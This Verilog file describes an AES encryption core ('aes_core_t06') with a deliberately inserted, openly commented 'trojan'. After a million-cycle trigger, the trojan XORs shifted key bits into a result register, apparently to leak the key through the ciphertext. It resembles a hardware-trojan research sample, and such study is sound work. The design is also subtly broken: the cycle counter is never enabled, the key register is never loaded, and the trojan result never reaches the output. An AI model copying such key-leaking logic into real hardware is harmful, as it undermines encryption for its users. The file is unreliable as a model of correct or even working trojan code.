`default_nettype none

module aes_core_t06(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );




  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;
  localparam T06_TRIGGER = 1000000; // 1 million cycles

  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  reg [31 : 0]  cycle_counter;
  reg         cycle_counter_en;

  reg [127 : 0]  result_reg;
  reg [127 : 0]  result_reg_new;
  reg [127 : 0]  result_reg_we;

  reg [127 : 0]  key_reg;
  reg [127 : 0]  key_reg_new;
  reg [127 : 0]  key_reg_we;

  reg [127 : 0]  block_reg;
  reg [127 : 0]  block_reg_new;
  reg [127 : 0]  block_reg_we;

  reg [127 : 0]  result_reg_t06;
  reg [127 : 0]  result_reg_t06_new;
  reg [127 : 0]  result_reg_t06_we;

  reg [127 : 0]  key_reg_t06;
  reg [127 : 0]  key_reg_t06_new;
  reg [127 : 0]  key_reg_t06_we;

  reg [127 : 0]  block_reg_t06;
  reg [127 : 0]  block_reg_t06_new;
  reg [127 : 0]  block_reg_t06_we;

  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready        = ready_reg;
  assign result       = muxed_new_block;
  assign result_valid = result_valid_reg;


  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg  <= 1'b0;
          ready_reg         <= 1'b1;
          aes_core_ctrl_reg <= CTRL_IDLE;
          cycle_counter     <= 0;
          cycle_counter_en  <= 1'b0;
          result_reg        <= 0;
          result_reg_new    <= 0;
          result_reg_we     <= 1'b0;
          key_reg           <= 0;
          key_reg_new       <= 0;
          key_reg_we        <= 1'b0;
          block_reg         <= 0;
          block_reg_new     <= 0;
          block_reg_we        <= 1'b0;
          result_reg_t06    <= 0;
          result_reg_t06_new<= 0;
          result_reg_t06_we <= 1'b0;
          key_reg_t06       <= 0;
          key_reg_t06_new   <= 0;
          key_reg_t06_we    <= 1'b0;
          block_reg_t06     <= 0;
          block_reg_t06_new <= 0;
          block_reg_t06_we    <= 1'b0;
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          if (cycle_counter_en)
            cycle_counter <= cycle_counter + 1;

          if (result_reg_we)
            result_reg <= result_reg_new;

          if (key_reg_we)
            key_reg <= key_reg_new;

          if (block_reg_we)
            block_reg <= block_reg_new;

          if (result_reg_t06_we)
            result_reg_t06 <= result_reg_t06_new;

          if (key_reg_t06_we)
            key_reg_t06 <= key_reg_t06_new;

          if (block_reg_t06_we)
            block_reg_t06 <= block_reg_t06_new;
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //
  // Controls which of the encipher datapath or the key memory
  // that gets access to the sbox.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdec_mux
  //
  // Controls which of the datapaths that get the next signal, have
  // access to the memory as well as the block processing result.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          // Encipher operations
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          // Decipher operations
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //
  // Control FSM for aes core. Basically tracks if we are in
  // key init, encipher or decipher modes and connects the
  // different submodules to shared resources and interface ports.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin

          end
      endcase // case (aes_core_ctrl_reg)

    end // aes_core_ctrl


  //----------------------------------------------------------------
  // T06 trojan logic
  //
  // Rotates a byte of the ciphertext with a byte of the key after
  // a specified number of operations.
  //----------------------------------------------------------------
  always @*
    begin : t06_trojan
      if (aes_core_ctrl_reg == CTRL_NEXT && cycle_counter == T06_TRIGGER)
        begin
          result_reg_t06_new = result_reg_t06 ^ (key_reg_t06 << 8);
          result_reg_t06_we  = 1'b1;
        end
      else
        begin
          result_reg_t06_new = result_reg_t06;
          result_reg_t06_we  = 1'b0;
        end
    end // t06_trojan


  //----------------------------------------------------------------
  // Update registers with trojan logic
  //
  // Updates the registers with the trojan logic applied.
  //----------------------------------------------------------------
  always @*
    begin : t06_update
      if (aes_core_ctrl_reg == CTRL_NEXT && cycle_counter == T06_TRIGGER)
        begin
          result_reg_new = result_reg_t06;
          result_reg_we  = 1'b1;
        end
      else
        begin
          result_reg_new = result_reg;
          result_reg_we  = 1'b0;
        end
    end // t06_update


  //----------------------------------------------------------------
  // Update registers with trojan logic
  //
  // Updates the registers with the trojan logic applied.
  //----------------------------------------------------------------
  always @*
    begin : t06_update_key
      if (aes_core_ctrl_reg == CTRL_INIT)
        begin
          key_reg_t06_new = key_reg;
          key_reg_t06_we  = 1'b1;
        end
      else
        begin
          key_reg_t06_new = key_reg_t06;
          key_reg_t06_we  = 1'b0;
        end
    end // t06_update_key


  //----------------------------------------------------------------
  // Update registers with trojan logic
  //
  // Updates the registers with the trojan logic applied.
  //----------------------------------------------------------------
  always @*
    begin : t06_update_block
      if (aes_core_ctrl_reg == CTRL_INIT)
        begin
          block_reg_t06_new = block_reg;
          block_reg_t06_we  = 1'b1;
        end
      else
        begin
          block_reg_t06_new = block_reg_t06;
          block_reg_t06_we  = 1'b0;
        end
    end // t06_update_block


endmodule // aes_core_t06

